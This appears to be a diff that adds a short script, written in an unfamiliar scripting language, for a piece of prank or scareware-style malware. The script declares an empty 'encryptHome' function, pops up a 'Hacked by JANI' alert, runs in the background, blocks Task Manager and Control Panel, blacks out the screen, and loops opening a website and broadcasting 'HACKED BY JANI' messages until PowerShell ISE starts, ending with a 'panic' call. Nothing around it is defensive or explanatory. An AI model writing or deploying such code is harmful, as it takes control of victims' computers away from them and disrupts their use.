@@ -1,0 +1,29 @@
+fun encryptHome(
+    a: text
+): nul (
+)
+
+fun <fallback> alert(): nul ()
+
+alert(
+    title:   "Hacked by JANI"
+    content: "Hello, %USERNAME%!"
+    btns:    0
+    icon:    16
+);
+
+mode background;
+
+disallow(name: "taskmgr.exe");
+disallow(name: "control.exe");
+
+foreground start(command: "cmd.exe");
+
+blackscreen(timeout: 3);
+
+while not isStarted(exe: "PowerShell_ISE.exe") (
+    browser(url: "https://uncoverit.org");
+    cmd(command: "msg * /V /TIME:1 HACKED BY JANI");
+);
+
+panic;
